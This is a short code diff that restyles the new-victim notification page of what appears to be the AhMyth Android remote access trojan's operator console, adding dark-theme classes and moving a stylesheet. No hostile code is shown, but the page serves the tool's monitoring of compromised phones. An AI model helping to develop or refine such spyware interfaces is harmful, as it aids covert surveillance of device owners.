@@ -24,28 +24,28 @@
         if (window.module) module = window.module;
     </script>
 
-    <link rel="stylesheet" href="css/mystyle.css">
+    <link rel="stylesheet" href="assets/css/mystyle.css">
     <link rel="stylesheet" href="../node_modules/fomantic-ui/dist/semantic.min.css" />
 
 
 </head>
 
-<body ng-controller="NotifiCtrl" class="nopadding">
+<body ng-controller="NotifiCtrl" class="nopadding dark">
 <audio autoplay>
   <source src="Audio/AhMyth-notification.mp3" type="audio/mpeg">
 </audio>
 
-    <div class="ui cards">
-        <div class="red card">
+    <div class="bg ui cards">
+        <div class="red bg card">
             <div class="content">
                 <span class="right floated">
                             <i  ng-if="victimCountry != null" class="{{victimCountry}} flag"></i>
                             <i ng-if="victimCountry == null" class="help circle icon"></i>
                         </span>
-                <div class="header" ng-bind="victimModel">
+                <div class="header bg" ng-bind="victimModel">
 
                 </div>
-                <div class="meta" ng-bind="victimSocket">
+                <div class="meta bg" ng-bind="victimSocket">
 
                 </div>
 
